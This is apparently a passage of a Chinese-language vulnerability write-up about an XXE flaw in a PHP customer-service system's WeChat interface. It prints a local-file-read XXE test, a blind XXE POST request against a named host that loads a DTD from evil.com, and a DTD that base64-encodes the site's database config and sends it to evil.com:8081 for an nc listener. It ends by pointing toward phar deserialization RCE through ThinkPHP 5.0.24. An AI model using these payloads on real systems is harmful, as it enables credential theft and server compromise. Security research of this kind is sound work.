<?php$xml = '<?xml version="1.0"?><!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]><user><username>&xxe;</username><password>admn</password></user>';$xml = simplexml_load_string($xml);var_dump($xml);

还真不成功，更换诸多php版本发现，大概是在php5.5版本，libxml扩展更新到2.9版本。至此默认不再支持外部实体，所以simplexml_load_string()的XXE需要php5.4或者5.4以下版本。

而这个客服系统，安装时的最低版本恰好也是5.4版本。

                    <?php                    if (PHP_VERSION >= '5.4') {                        ?>

所以这个XXE漏洞有理论上的利用可能，但实际情况下，几乎所有的网站都用的php7，漏洞无法利用成功。

同时这个漏洞好像也比较出名，是微信接口使用的xml，我曾在别的地方也见过，不过很难出XXE漏洞，基本都修复了。


只能自己搭一个5.4的环境自嗨一下了。

这是一个无回显XXE，故需要使用dtd将要读取的文件带出。

POST /weixin/index/index HTTP/1.1Host: luoke.cn:83Content-Length: 173
<?xml version="1.0"?><!DOCTYPE GVI [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><user><username>admin</username><password>admin</password></user>

evil.dtd内容如下，然后在evil.com上nc监听8081端口即可。

<!ENTITY % all SYSTEM "php://filter/convert.base64-encode/resource=../config/database.php">        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com:8081/?test=%all;'>">        %eval;        %error;

成功带出base64编码的配置文件，解码可获取数据库账户密码。


这就完了吗？显然不，php的XXE支持phar://协议，phar会反序列化meta-data，而此客服管理系统用的thinkphp5.0.24有一条完美的反序列化链可以RCE。
